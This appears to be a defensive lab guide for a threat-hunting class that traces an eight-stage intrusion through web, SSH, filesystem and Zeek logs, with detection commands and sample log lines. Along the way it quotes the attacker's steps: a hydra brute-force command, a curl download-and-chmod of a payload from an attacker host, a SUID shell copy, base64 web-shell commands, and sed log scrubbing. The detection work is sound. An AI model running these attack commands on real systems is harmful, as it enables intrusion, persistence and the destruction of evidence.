# Class 11 — Detection Walkthrough

**The defender's mirror of `ATTACK-MANUAL.md`: for every attack stage, the exact
log line that proves it happened, where that line lives, and the command that
surfaces it.**

`ATTACK-MANUAL.md` runs the 8-stage intrusion with real Kali tools. This document
walks the **same 8 stages from the logs** — you run the attack (or someone else
did), then come here to identify each step cold. Pair it with
`SOC-INVESTIGATION-PLAYBOOK.md`, which turns these findings into an incident call.

All log samples below are **real output captured from this lab's containers**.

---

## Log topology of this lab

| Signal | Where it lives (live) | Read it with | `collect.sh` puts it in | Real-host equivalent |
|---|---|---|---|---|
| Web access | `web01-dvwa:/var/log/apache2/access.log` | `docker exec web01-dvwa cat …` | `./work/var/log/syslog` (merged) | `/var/log/apache2/access.log`, `/var/log/nginx/access.log` |
| Web errors | `web01-dvwa:/var/log/apache2/error.log` | `docker exec web01-dvwa cat …` | *(not collected — check live)* | `/var/log/apache2/error.log` |
| SSH auth | `web01-ssh:/config/logs/openssh/current` | `docker exec web01-ssh cat …` | `./work/var/log/syslog` (merged, via `docker logs`) | `/var/log/auth.log`, `/var/log/secure` |
| Filesystem state | the containers themselves | `docker exec … find …` | `./work/{opt/bin,dev/shm,tmp,var/www}` | the host / a disk image |
| Network flows | Zeek `conn.log` | — | `./work/zeek/conn.log` (from `scenario/` unless live Zeek) | Zeek `conn.log`, NetFlow, firewall logs |
| CTI | `scenario/apt_report.txt` | — | `./work/apt_report.txt` | your TIP / MISP |

Build the collected copy any time with **`./collect.sh`** (victim must be up).

### Read this before you read an IP

- **On Docker Desktop (this Mac setup)** every request that originates on the host
  shows a client IP of **`192.168.65.1`** (the Docker gateway). That is the
  "attacker" in the samples below. It does not mean the traffic came from that
  address — it means it came through the host.
- **On a real lab network** with a separate Kali VM, you get Kali's actual IP
  (e.g. `192.168.56.5`).
- **The canned `scenario/` data** (used by `hunt.sh` steps 2–3 and the offline
  `setup.sh`) uses the *TIN MAGPIE* addresses — `45.153.160.140`,
  `193.169.255.78`, `5.42.92.211`. When you hunt the collected `./work/`,
  `collect.sh` also appends *your* loudest source IP to `work/malicious_ips.txt`
  so `hunt.sh` step 2 lands on the real attack too.

The **method** — "one source, burst of failures, then a hit" — is what you key on,
not the literal address.

---

## Stage 0 — Get the logs in front of you

```bash
cd labs/class-11-threat-hunting

# option A — pull everything into ./work/ in one shot
./collect.sh
find ./work -type f -exec sha256sum {} + > work.sha256     # integrity baseline

# option B — read the live containers directly (nothing is collected)
docker exec web01-dvwa cat /var/log/apache2/access.log      # web access
docker exec web01-dvwa cat /var/log/apache2/error.log       # web errors
docker exec web01-ssh  cat /config/logs/openssh/current     # ssh auth
```

Keep both terminals: `./work/` for the hunt, live `docker exec` for the things
`collect.sh` does not snapshot (error.log, cron, systemd units, `authorized_keys`).

---

## Stage 1 — Reconnaissance & enumeration

**Attacker did:** `masscan` / `nmap` port sweep, `whatweb`, `nikto`, `feroxbuster`
content discovery against `:8080`.

**Signal source:** web access log — a burst of requests from one client in a short
window, many `404`s, telltale scanner paths and User-Agents.

```bash
# live
docker exec web01-dvwa awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head
docker exec web01-dvwa grep -E '" (404|403) ' /var/log/apache2/access.log | tail -20
docker exec web01-dvwa grep -iE 'nikto|feroxbuster|gobuster|dirb|nmap|masscan|curl|wget|python-requests' \
  /var/log/apache2/error.log /var/log/apache2/access.log

# collected
grep -E '" (GET|HEAD) ' ./work/var/log/syslog | awk '{print $1}' | sort | uniq -c | sort -rn | head
```

**What it looks like** (real, from the auto-config run — same shape a scanner makes,
just louder):

```
192.168.65.1 - - [03/Sep/2026:13:11:06 +0000] "GET /login.php HTTP/1.1" 200 1937 "-" "curl/8.7.1"
192.168.65.1 - - [03/Sep/2026:13:11:06 +0000] "GET /setup.php HTTP/1.1" 200 4489 "-" "curl/8.7.1"
```

**Reading it:** hundreds of requests from one IP inside a minute, a wall of `404`s
walking a wordlist, a non-browser User-Agent (`curl/8.7.1`, `Nikto`,
`feroxbuster`, `python-requests`), and hits on `/setup.php`,
`/vulnerabilities/`, `/hackable/uploads/` that no real user would request in that
order. A single `feroxbuster` run is unmistakable in the access log.

**Network corroboration:** Suricata `ET SCAN` rules, Zeek `conn.log` showing many
short-lived connections from one source.

**ATT&CK:** T1595 (active scanning), T1046 (network service discovery).

---

## Stage 2 — Credential access (SSH brute / spray)

**Attacker did:** `hydra -L users.txt -P pw_small.txt ssh://$VICTIM:2222` (also
`medusa` / `patator` / `ffuf` for the DVWA web login).

**Signal source:** SSH auth log — a `Failed password` / `Invalid user` burst from
one source, then (if it worked) an `Accepted` line.

```bash
# live — the openssh log
docker exec web01-ssh cat /config/logs/openssh/current

# count failures per source
docker exec web01-ssh grep -E 'Failed password|Invalid user' /config/logs/openssh/current \
  | grep -oE 'from [0-9.]+' | sort | uniq -c | sort -rn

# the pivot: did any of that convert to a success?
docker exec web01-ssh grep -E 'Accepted (password|publickey)' /config/logs/openssh/current

# collected (merged stream)
grep -Ei 'failed password|invalid user|accepted' ./work/var/log/syslog
```

**What it looks like** (real — three wrong passwords for a valid user from one
source in the same second):

```
2026-09-03 13:18:17.706459296  Invalid user baduser from 192.168.65.1 port 60074
2026-09-03 13:18:17.736133297  Connection closed by invalid user baduser 192.168.65.1 port 60074 [preauth]
2026-09-03 13:18:40.749739502  Failed password for support from 192.168.65.1 port 31022 ssh2
2026-09-03 13:18:40.758130918  Failed password for support from 192.168.65.1 port 31022 ssh2
2026-09-03 13:18:40.766114085  Failed password for support from 192.168.65.1 port 31022 ssh2
```

A hydra run produces dozens to hundreds of these per minute. `Invalid user`
lines name accounts that do not exist (`root`, `deploy`, `www-data`) — that is
dictionary spraying, not a fat-fingered admin.

**Reading it:**
- **Attempt only** — failures, no matching `Accepted`. Event, not incident.
- **Successful** — a `Failed password` burst from `X`, then
  `Accepted password for support from X`. That is the foothold. Note the
  timestamp — it anchors the timeline.

**Web-login brute (DVWA):** in `access.log`, many `POST /login.php` `302`/`200`
from one IP; the successful one is the request after which the attacker stops
hitting `/login.php` and starts hitting authenticated pages.

**Also on a real host:** `/var/log/auth.log` (Debian) or `/var/log/secure`
(RHEL); Wazuh rules 5710 / 5712 / 5720; fail2ban jail hits (Class 12).

**ATT&CK:** T1110 (brute force).

---

## Stage 3 — Initial access (web shell upload)

**Attacker did:** `weevely generate` an obfuscated `agent.php`, or copy
`scenario/webshell.php`, then `curl -F "uploaded=@…;type=image/png"` to
`/vulnerabilities/upload/`.

**Signal source:** (a) the file on disk, (b) `POST /vulnerabilities/upload/` in
the access log, (c) — the loud one — a **PHP error from inside the uploads
directory** in `error.log`.

```bash
# a) the file — anything executable/PHP under a web-writable path
docker exec web01-dvwa ls -la --time-style=full-iso /var/www/html/hackable/uploads/
docker exec web01-dvwa find /var/www/html -name '*.php' -newermt '-2 days' -ls
yara -r rules/hunt_webshell.yar ./work/var/www/html/          # or: ./hunt.sh  (step 1)

# b) the upload request, then the interaction
docker exec web01-dvwa grep -E 'POST /vulnerabilities/upload/' /var/log/apache2/access.log
docker exec web01-dvwa grep -E 'GET /hackable/uploads/.*\.php' /var/log/apache2/access.log

# c) PHP executing from the uploads dir  <-- highest-confidence single line
docker exec web01-dvwa grep -E "uploads/.*\.php" /var/log/apache2/error.log
```

**What it looks like** (real — upload, then two shell calls, then the interpreter
choking on the payload):

```
# access.log
192.168.65.1 - - [03/Sep/2026:13:18:53 +0000] "POST /vulnerabilities/upload/ HTTP/1.1" 200 4621 "-" "curl/8.7.1"
192.168.65.1 - - [03/Sep/2026:13:18:53 +0000] "GET /hackable/uploads/webshell.php?c=aWQ= HTTP/1.1" 500 185 "-" "curl/8.7.1"
192.168.65.1 - - [03/Sep/2026:13:18:53 +0000] "GET /hackable/uploads/webshell.php?c=dW5hbWUgLWE= HTTP/1.1" 500 185 "-" "curl/8.7.1"

# error.log
[03/Sep/2026:13:18:53] [:error] [client 192.168.65.1] PHP Parse error: ... in
  /var/www/html/hackable/uploads/webshell.php(9) : eval()'d code on line 1
```

**Reading it:**
- `POST /vulnerabilities/upload/` from an external IP, immediately followed by
  `GET /hackable/uploads/<name>.php` from the **same IP** = upload → validate the
  shell landed. Textbook.
- The `?c=aWQ=` query string is base64 (`aWQ=` → `id`, `dW5hbWUgLWE=` →
  `uname -a`) — command-through-URL, the webshell tell.
- `eval()'d code` **in a path under `/uploads/`** in `error.log` is about as
  unambiguous as web-log evidence gets: user-uploaded content is being executed
  as PHP. Status `500` vs `200` only tells you if the payload ran cleanly — the
  attempt is logged either way.

**ATT&CK:** T1190 (exploit public-facing app), T1505.003 (web shell).

---

## Stage 4 — Execution & discovery

**Attacker did:** drove the shell (`weevely` session) to run `id`, `hostname`,
`uname -a`, `cat /etc/passwd`, `sudo -l`, then pulled and ran `linpeas.sh`.

**Signal source:** repeated authenticated hits to the shell from one IP
(access log); on a real host, auditd `execve` records for discovery binaries run
by `www-data`.

```bash
# every hit on the shell — cadence and count show hands-on-keyboard
docker exec web01-dvwa grep -E 'hackable/uploads/.*\.php' /var/log/apache2/access.log \
  | awk '{print $1, $4, $7}'

# linpeas / enum script pulled over HTTP (see also Stage 5)
docker exec web01-dvwa grep -iE 'linpeas|lse\.sh|enum|/tmp/\.' /var/log/apache2/access.log

# collected
grep -E 'uploads/.*\.php\?' ./work/var/log/syslog
```

**Reading it:** a handful of `GET /hackable/uploads/agent.php` over several
minutes, each with a different base64 `c=` payload, is an interactive session.
Contrast with Stage 3's two quick validation hits. On a container there is no
auditd, so the web log *is* your execution evidence here; on a real host, pair it
with `auditd` / `sysmon-for-linux` `execve` events for `whoami`, `id`, `uname`,
`find`, `cat /etc/passwd` under the web user.

**ATT&CK:** T1059 (command interpreter), T1082 (system info discovery), T1087
(account discovery).

---

## Stage 5 — Ingress tool transfer (second stage)

**Attacker did:** built an ELF with `msfvenom`, served it with
`python3 -m http.server`, then on the victim
`curl http://$LHOST/update -o /dev/shm/.u && chmod +x /dev/shm/.u`.

**Signal source:** a victim-initiated `curl`/`wget` to an unusual host in the
logs, plus the dropped file in a memory-backed dir.

```bash
# the download command in the web/cron/shell logs
docker exec web01-dvwa grep -iE '(curl|wget|fetch).*(http|ftp)://' \
  /var/log/apache2/access.log /var/log/apache2/error.log
grep -iE '(curl|wget).*(http|ftp)://' ./work/var/log/syslog

# the file it wrote
docker exec web01-dvwa sh -c 'ls -la /dev/shm /tmp; file /dev/shm/* /tmp/.* 2>/dev/null'
find ./work/dev/shm ./work/tmp -type f -perm -111 -exec ls -l {} +      # or ./hunt.sh (step 5)
```

**What it looks like** (from the canned scenario syslog — a cron-driven pull):

```
Aug 30 19:41:10 web01 CRON[2410]: (www-data) CMD (curl -s http://5.42.92.211/win/update.hta -o /tmp/.u)
```

**Reading it:** a service account (`www-data`) running `curl` **outbound** to a
bare IP on a non-standard path, writing to `/tmp/.u` or `/dev/shm/.u` (hidden,
memory-backed, wiped on reboot — chosen precisely to avoid disk forensics). Legit
web apps almost never `curl` the internet from `www-data`.

**Network corroboration:** Zeek `http.log` / `files.log` showing an
`application/x-executable` (ELF) fetched over HTTP; Suricata ET rule on the
retrieval.

**ATT&CK:** T1105 (ingress tool transfer).

---

## Stage 6 — Persistence

**Attacker did:** (a) hidden SUID-root shell `cp /bin/dash /opt/.helper &&
chmod 4755`; (b) cron beacon; (c) `soc-update.service` systemd unit;
(d) appended a key to `~/.ssh/authorized_keys`.

**Signal source:** filesystem state — none of this is in a text log, you go
looking for it. `collect.sh` snapshots the SUID inventory and `/dev/shm`; the
cron/systemd/key checks you run live.

```bash
# a) anomalous SUID/SGID — hidden names, shell copies outside /bin
find ./work -type f -perm -04000 -exec ls -l {} +                    # or ./hunt.sh (step 4)
docker exec web01-ssh  find / -xdev -type f -perm -4000 2>/dev/null
docker exec web01-dvwa find / -xdev -type f -perm -4000 2>/dev/null
cat ./work/opt/bin/.suid_inventory

# b) cron
docker exec web01-ssh sh -c 'crontab -l 2>/dev/null; ls -la /etc/cron.d /etc/cron.*/ 2>/dev/null; cat /etc/crontab'

# c) systemd units pointing at odd paths
docker exec web01-ssh sh -c 'ls -la /etc/systemd/system/; grep -rE "ExecStart=.*(/tmp|/dev/shm|/var/www|curl|wget)" /etc/systemd/system/ 2>/dev/null'

# d) SSH key backdoor
docker exec web01-ssh sh -c 'cat ~/.ssh/authorized_keys /home/*/.ssh/authorized_keys 2>/dev/null'
```

**What it looks like** (real — `hunt.sh` step 4 on a staged `./work/`):

```
-rwsr-xr-x 1 root root 121432 opt/bin/.helper          # SUID root, dot-hidden, = a shell copy
```

**Reading it:**
- A **SUID-root** binary whose name starts with `.`, or a `dash`/`bash`/`sh` copy
  anywhere outside `/bin` and `/usr/bin`, is persistence + privesc. Compare the
  set against a clean image of the same distro — anything extra is suspect.
- A cron line or systemd `ExecStart=` that runs `curl`/`wget` or executes from
  `/tmp`, `/dev/shm`, or `/var/www` is not a system job.
- An `authorized_keys` entry you cannot tie to a known admin = remote backdoor.
  Check its position (appended last) and the comment field.

**On a real host:** auditd watches on `/etc/cron*`, `/etc/systemd/`, and
`~/.ssh/` catch the *moment* of the change; FIM (AIDE, Wazuh syscheck) flags the
new file against baseline.

**ATT&CK:** T1548.001 (setuid/setgid), T1053.003 (cron), T1543.002 (systemd
service), T1098.004 (SSH authorized_keys).

---

## Stage 7 — Command & Control (long-interval beacon)

**Attacker did:** a beacon calling home every ~3600 s with a few hundred bytes
each way (Metasploit `set_timeouts -c 3600`, Sliver `--seconds 3600`, or a bash
`while … sleep 3600` loop).

**Signal source:** Zeek `conn.log` — repeated same-`src`→same-`dst:443`, near
constant tiny byte counts, regular interval. IPs rotate between campaigns; **this
shape does not.** This is the durable detection to hand to detection engineering.

```bash
# collected conn.log — sort by duration
zeek-cut id.orig_h id.resp_h id.resp_p duration orig_bytes resp_bytes \
  < ./work/zeek/conn.log | sort -k4 -nr | head          # or ./hunt.sh (step 3)

# no zeek-cut? awk the columns
awk -F'\t' '!/^#/ && $9>600 {print $3, $5, $6, $9, $10, $11}' ./work/zeek/conn.log
```

**What it looks like** (real — `scenario/conn.log`, the three beacon rows):

```
ts            orig_h    resp_h          resp_p dur      orig_b resp_b state
1756557600.0  10.0.0.5  45.153.160.140  443    3600.11  512    644    SF
1756561200.0  10.0.0.5  45.153.160.140  443    3598.90  498    640    SF
1756564800.0  10.0.0.5  45.153.160.140  443    3601.33  530    651    SF
```

**Reading it:** three sessions, one internal host → one external IP:443, each
~3600 s (opened one hour apart: `1756557600 → 1756561200 → 1756564800`), all
under ~1 KB transferred. A human browsing HTTPS moves megabytes in bursts; a
backup runs once; **only automation dials a fixed number every hour and says
almost nothing.** The `resp_bytes` being tiny and near-constant rules out a
download.

> In this Docker-Desktop lab the live Zeek stack does not see the container
> traffic, so `collect.sh` falls back to `scenario/conn.log` for this stage —
> that is expected and called out in the collector's output. On a real network
> you would read your own Zeek `conn.log` and see the same pattern with your own
> addresses.

**ATT&CK:** T1071.001 (web protocols), T1573 (encrypted channel).

---

## Stage 8 — Defense evasion / anti-forensics

**Attacker did:** `history -c`, `unset HISTFILE`, `touch -r /bin/ls` to timestomp
the implants, `sed -i '/45.153.160.140/d' /var/log/auth.log` to scrub the brute
force, `shred -u` the enum output.

**Signal source:** the discrepancy — what the live log *no longer* says vs. what
the archived/rotated copy and the SIEM still have.

```bash
# does the archive contain attacker IPs the live log doesn't?
grep -c '45.153.160.140' ./work/var/log/syslog
zgrep -c '45.153.160.140' ./work/var/log/archive/*.gz
grep -c '45.153.160.140' ./work/var/log/archive/syslog.1
#   live count 0, archive count > 0  ==  the live log was edited

# timestomping — implants sharing an mtime to the second with a system binary
docker exec web01-dvwa sh -c 'stat -c "%y %n" /bin/ls /dev/shm/.u /opt/.helper 2>/dev/null'

# always run hunt 2 against archives, not just the live file
./hunt.sh -s          # step 2 uses grep -rF AND zgrep on ./work/var/log/archive/
```

**Reading it:** you cannot prove a deletion from the file that was deleted from —
you prove it from a **second copy the attacker did not control**: the rotated
`*.1` / `*.gz`, the Zeek record, the SIEM index, the firewall log. If
`syslog.1` has `Failed password … 45.153.160.140` lines and today's `syslog`
does not, someone edited the live log. That *is* the finding. `collect.sh`
deliberately keeps `archive/syslog.1` and `archive/syslog.2.gz` so `hunt.sh`
step 2 still lands after a scrub.

**The lesson:** anti-forensics on the box is a race the attacker already lost if
your telemetry left the box in real time. Ship logs off-host.

**ATT&CK:** T1070.002 (clear Linux logs), T1070.003 (clear history), T1070.006
(timestomp).

---

## Put it on a timeline

Pull one timestamp per confirmed stage into a single ordered list (normalise to
UTC — Apache logs here are `+0000`, the openssh log is already UTC):

```
13:11:06  Stage 1  recon — request burst from 192.168.65.1 (scanner UA)
13:18:17  Stage 2  brute — Invalid user / Failed password burst, same source
13:18:40  Stage 2  (still failing — no Accepted line yet in this capture)
13:18:53  Stage 3  upload — POST /vulnerabilities/upload/  ->  webshell.php
13:18:53  Stage 3  exec   — GET /hackable/uploads/webshell.php?c=aWQ=  (eval()'d code in error.log)
  …       Stage 5  transfer — CRON www-data curl http://5.42.92.211/... -o /tmp/.u
  …       Stage 6  persist  — opt/bin/.helper  (SUID root)  +  /dev/shm/.u
  …       Stage 7  C2       — 10.0.0.5 -> 45.153.160.140:443  x3  ~3600s
  …       Stage 8  evasion  — auth.log lines gone; archive still has them
```

Then take it to `SOC-INVESTIGATION-PLAYBOOK.md` §2 (make the call) and §6 (write
the report).

---

## Appendix A — one-shot detection sweep

```bash
#!/bin/bash
# run from labs/class-11-threat-hunting/  — victim must be up (./victim/run.sh)
set -e
D=web01-dvwa ; S=web01-ssh

echo "== S1 recon: requests per client IP =="
docker exec $D awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head

echo "== S1 recon: 404 storm + scanner UAs =="
docker exec $D grep -E '" 404 ' /var/log/apache2/access.log | wc -l
docker exec $D grep -iE 'nikto|ferox|gobuster|nmap|masscan|sqlmap' /var/log/apache2/access.log | head

echo "== S2 brute: SSH failures per source, then successes =="
docker exec $S grep -E 'Failed password|Invalid user' /config/logs/openssh/current \
  | grep -oE 'from [0-9.]+' | sort | uniq -c | sort -rn
docker exec $S grep -E 'Accepted (password|publickey)' /config/logs/openssh/current || echo "  (no successful SSH login logged)"

echo "== S3 webshell: upload + interaction + PHP-from-uploads =="
docker exec $D grep -E 'POST /vulnerabilities/upload/|GET /hackable/uploads/.*\.php' /var/log/apache2/access.log
docker exec $D grep -E 'uploads/.*\.php' /var/log/apache2/error.log || echo "  (no PHP errors from uploads dir)"

echo "== S5 transfer: outbound curl/wget in logs, files in memory dirs =="
docker exec $D grep -iE '(curl|wget).*(http|ftp)://' /var/log/apache2/*.log || echo "  (none in web logs)"
docker exec $D sh -c 'ls -la /dev/shm /tmp; file /dev/shm/.* 2>/dev/null' 

echo "== S6 persistence: SUID / cron / systemd / keys =="
for c in $D $S; do docker exec $c find / -xdev -type f -perm -4000 2>/dev/null | sed "s/^/  $c: /"; done
docker exec $S sh -c 'crontab -l 2>/dev/null; ls -la /etc/systemd/system/; cat ~/.ssh/authorized_keys 2>/dev/null'

echo "== S7 beacon: long low-byte sessions =="
zeek-cut id.orig_h id.resp_h id.resp_p duration orig_bytes resp_bytes < ./work/zeek/conn.log 2>/dev/null \
  | sort -k4 -nr | head || awk -F'\t' '!/^#/ && $9>600' ./work/zeek/conn.log

echo "== S8 evasion: live vs archive IP counts =="
for ip in 45.153.160.140 193.169.255.78; do
  printf '  %s  live=%s  archive=%s\n' "$ip" \
    "$(grep -c "$ip" ./work/var/log/syslog 2>/dev/null || echo -)" \
    "$(zgrep -hc "$ip" ./work/var/log/archive/*.gz 2>/dev/null | paste -sd+ | bc 2>/dev/null || echo -)"
done
```

## Appendix B — attack → signal quick reference

| Stage | Attack | Log / artifact | Key string to grep | ATT&CK |
|---|---|---|---|---|
| 1 | Recon / scan | `apache2/access.log` | one IP, request burst, `404` storm, scanner UA | T1595, T1046 |
| 2 | SSH brute | `openssh/current` | `Failed password`, `Invalid user`, then `Accepted` | T1110 |
| 3 | Webshell upload | `access.log` + `error.log` | `POST /vulnerabilities/upload/`, `uploads/*.php?c=`, `eval()'d code` | T1190, T1505.003 |
| 4 | Execution / discovery | `access.log` | repeated `GET /hackable/uploads/*.php?c=<base64>` | T1059, T1082, T1087 |
| 5 | Second-stage pull | `access.log` / cron / syslog | `www-data` `curl`/`wget` to bare IP, write to `/dev/shm` `/tmp` | T1105 |
| 6 | Persistence | filesystem | SUID `.helper`, `/dev/shm/.u`, odd cron/systemd, extra `authorized_keys` | T1548.001, T1053, T1543, T1098 |
| 7 | C2 beacon | Zeek `conn.log` | same src→dst:443, ~3600 s, <1 KB, ×3+ | T1071.001, T1573 |
| 8 | Anti-forensics | archived logs | attacker IP in `*.1`/`*.gz` but not in live log | T1070 |

> Lab IPs and hashes are fictitious — do not submit them to production intel platforms.
